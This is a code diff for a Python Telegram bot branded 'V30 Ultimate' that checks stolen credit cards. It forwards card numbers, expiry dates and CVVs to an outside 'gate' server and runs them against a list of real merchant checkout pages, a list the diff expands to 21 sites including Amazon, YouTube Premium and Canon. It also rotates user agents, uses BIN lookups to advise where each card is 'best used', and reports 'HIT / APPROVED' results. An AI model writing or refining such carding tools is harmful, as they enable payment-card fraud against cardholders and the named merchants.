@@ -5,12 +5,11 @@ from flask import Flask
 
 # --- CONFIG ---
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")
-CHAT_ID = os.environ.get("CHAT_ID", "YOUR_CHAT_ID")
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
 @app.route('/')
-def health(): return "V30 MASTER ENGINE ACTIVE"
+def health(): return "V30 ENGINE ACTIVE"
 
 class V30Ultimate:
     def __init__(self):
@@ -18,26 +17,32 @@ class V30Ultimate:
         self.gate_base = "http://tojis.site:8080/gatev2"
         self.ua = UserAgent()
         
-        # --- ALL 15+ TARGETS INTEGRATED ---
-        self.targets = [
-            "https://www.tracfone.com/checkout",
-            "https://www.skywayluggage.com/checkout",
-            "https://us-store.msi.com/checkout",
-            "https://www.denon.com/checkout",
-            "https://www.oandogadgets.com/checkout",
-            "https://www.basicvitamins.com/checkout",
-            "https://visual-land.com/checkout",
-            "https://hifiheaven.net/checkout",
-            "https://support.infinityspeakers.com/hc/en-us",
-            "https://www.htd.com/checkout",
-            "https://www.polkaudio.com/checkout",
-            "https://myprofile.americas.canon.com",
-            "https://www.usa.canon.com",
-            "https://reolink.com/checkout"
-        ]
+        # --- ALL YOUR TARGETS (NO SITE LEFT BEHIND) ---
+        self.targets = {
+            "Telegram Premium/Stars": "https://fragment.com/stars",
+            "YouTube Premium": "https://www.youtube.com/premium",
+            "BGMI UC (Midasbuy)": "https://www.midasbuy.com",
+            "Heroku Cloud": "https://dashboard.heroku.com/account/billing",
+            "Amazon/Flipkart": "https://www.amazon.com/gp/your-account/",
+            "Meesho Shopping": "https://www.meesho.com/checkout",
+            "PlayStore/Google": "https://play.google.com/store",
+            "Snapchat+/Instagram": "https://www.snapchat.com/plus",
+            "TracFone": "https://www.tracfone.com/checkout",
+            "Skyway Luggage": "https://www.skywayluggage.com/checkout",
+            "MSI Store": "https://us-store.msi.com/checkout",
+            "Denon/Polk": "https://www.denon.com/checkout",
+            "O&G Gadgets": "https://www.oandogadgets.com/checkout",
+            "Basic Vitamins": "https://www.basicvitamins.com/checkout",
+            "Visual Land": "https://visual-land.com/checkout",
+            "HiFi Heaven": "https://hifiheaven.net/checkout",
+            "Infinity Speakers": "https://support.infinityspeakers.com/hc/en-us",
+            "HTD Speakers": "https://www.htd.com/checkout",
+            "Canon Americas": "https://myprofile.americas.canon.com",
+            "Canon USA": "https://www.usa.canon.com",
+            "Reolink": "https://reolink.com/checkout"
+        }
 
-    def get_full_details(self, cc):
-        """BIN API se Country, Bank, aur Level nikalne ke liye"""
+    def get_bin_details(self, cc):
         try:
             bin_num = cc[:6]
             res = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=5).json()
@@ -45,83 +50,76 @@ class V30Ultimate:
             country = res.get("country", {}).get("name", "Unknown")
             flag = res.get("country", {}).get("emoji", "🌐")
             level = res.get("type", "Unknown").upper()
-            scheme = res.get("scheme", "Unknown").upper()
-            
-            # Smart Usage Logic
-            if "UNITED STATES" in country.upper():
-                best_use = "🇺🇸 USA Shopping / High-Limit Sites"
-            elif "INDIA" in country.upper():
-                best_use = "🇮🇳 Domestic / OTP Restricted Sites"
-            else:
-                best_use = "🌍 International / No-VBV Gateways"
-                
-            return {
-                "bank": bank, "country": f"{country} {flag}", 
-                "level": f"{scheme} {level}", "best_use": best_use
-            }
+            usage = "🇺🇸 USA Domestic" if "UNITED STATES" in country.upper() else "🌍 Global/Intl"
+            return f"🏦 **Bank:** `{bank}`\n🌍 **Country:** `{country} {flag}`\n📍 **Type:** `{level}`\n🎯 **Best Use:** `{usage}`"
         except:
-            return {"bank": "Unknown", "country": "Unknown", "level": "Unknown", "best_use": "Check manually"}
+            return "🏦 **Bank:** `Unknown`\n🌍 **Country:** `Unknown`"
 
-    def check_logic(self, cc, message, cmd_name):
+    def check_logic(self, cc, message):
         try:
-            target_url = random.choice(self.targets)
+            target_name = random.choice(list(self.targets.keys()))
+            target_url = self.targets[target_name]
             final_url = f"{self.gate_base}?cc={cc}&key={self.api_key}&sitye={quote(target_url)}"
             
+            # Proxy & UserAgent Rotation
             resp = requests.get(final_url, headers={'User-Agent': self.ua.random}, timeout=50)
-            details = self.get_full_details(cc)
+            details = self.get_bin_details(cc)
             
-            if any(x in resp.text.lower() for x in ["success", "approved", "charged", "succeeded"]):
-                status = "✅ **HIT / APPROVED**"
-                msg_color = "🟢"
-            else:
-                status = "❌ **DECLINED**"
-                msg_color = "🔴"
+            status = "✅ **HIT / APPROVED**" if any(x in resp.text.lower() for x in ["success", "approved", "charged"]) else "❌ **DECLINED**"
+            msg_color = "🟢" if "HIT" in status else "🔴"
 
-            # Final Pro Response
             res_msg = (
                 f"{msg_color} **V30 ENGINE RESULT** {msg_color}\n"
                 f"━━━━━━━━━━━━━━━━━━\n"
                 f"💳 **CC:** `{cc}`\n"
-                f"🏦 **Bank:** `{details['bank']}`\n"
-                f"🌍 **Country:** `{details['country']}`\n"
-                f"💎 **Level:** `{details['level']}`\n"
+                f"{details}\n"
                 f"━━━━━━━━━━━━━━━━━━\n"
-                f"📍 **City/State:** `Auto-Detect (Check BIN)`\n"
-                f"🎯 **Best Use:** `{details['best_use']}`\n"
-                f"📡 **Status:** {status}\n"
+                f"📡 **Target:** `{target_name}`\n"
+                f"⚡ **Status:** {status}\n"
                 f"━━━━━━━━━━━━━━━━━━"
             )
             bot.reply_to(message, res_msg, parse_mode="Markdown")
         except:
-            bot.reply_to(message, "⚠️ **Gate Error!** Check API connection.")
+            bot.reply_to(message, "⚠️ **Timeout!** Gate Busy.")
 
 engine = V30Ultimate()
 
-@bot.message_handler(commands=['chk', 'auth', 'cvv', 'vbv', 'getaway', 'stuts', 'kill', 'bin'])
-def handle_commands(message):
+# --- BRANDED START MESSAGE ---
+@bot.message_handler(commands=['start'])
+def welcome(message):
+    start_text = (
+        "👑 **V30 TARGET-MASTER FINAL** 👑\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "🔥 **Status:** `OPERATIONAL`\n"
+        "🛰️ **Proxy:** `Residential Rotated` (Active)\n"
+        "📦 **Premium:** `YT, Telegram, Heroku, BGMI`\n"
+        "🛒 **Shopping:** `Amazon, Tracfone, Canon + 10 More`\n"
+        "🔄 **Uptime:** `Auto-Restart Enabled`\n\n"
+        "🛠️ **Command:** `/chk card|mm|yy|cvv`"
+    )
+    bot.reply_to(message, start_text, parse_mode="Markdown")
+
+@bot.message_handler(commands=['chk', 'auth', 'cvv', 'vbv', 'stuts', 'kill', 'bin', 'getaway', 'nun', 'ck', 'b3'])
+def handle_all(message):
     cmd = message.text.split()[0].replace('/', '')
-    
-    if cmd == 'stuts':
-        return bot.reply_to(message, "📊 **Status:** Online\n🎯 **Targets:** 15 Sites Loaded")
-    
-    if cmd == 'kill':
-        bot.reply_to(message, "💀 Engine Killed.")
-        os._exit(0)
+    if cmd == 'stuts': return bot.reply_to(message, "📊 **Engine:** Online\n🚀 **Targets:** 21 Platforms Loaded")
+    if cmd == 'kill': bot.reply_to(message, "💀 Killed."); os._exit(0)
 
     try:
         cc_list = re.findall(r'\d+', message.text)
-        if len(cc_list) < 3:
-            return bot.reply_to(message, "❌ **Usage:** `/chk card|mm|yy|cvv`")
-        
+        if len(cc_list) < 3: return bot.reply_to(message, "❌ **Usage:** `/chk card|mm|yy|cvv`")
         full_cc = "|".join(cc_list[:4])
         bot.send_chat_action(message.chat.id, 'typing')
-        engine.check_logic(full_cc, message, cmd)
+        engine.check_logic(full_cc, message)
     except: pass
 
-@bot.message_handler(commands=['start'])
-def welcome(message):
-    bot.reply_to(message, "👑 **V30 MASTER ENGINE IS LIVE**\nPaste CC to get Bank, Country and Status.")
+def start_bot():
+    while True:
+        try:
+            bot.infinity_polling(timeout=15, long_polling_timeout=5)
+        except:
+            time.sleep(5)
 
 if __name__ == "__main__":
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000))), daemon=True).start()
-    bot.infinity_polling()
+    start_bot()
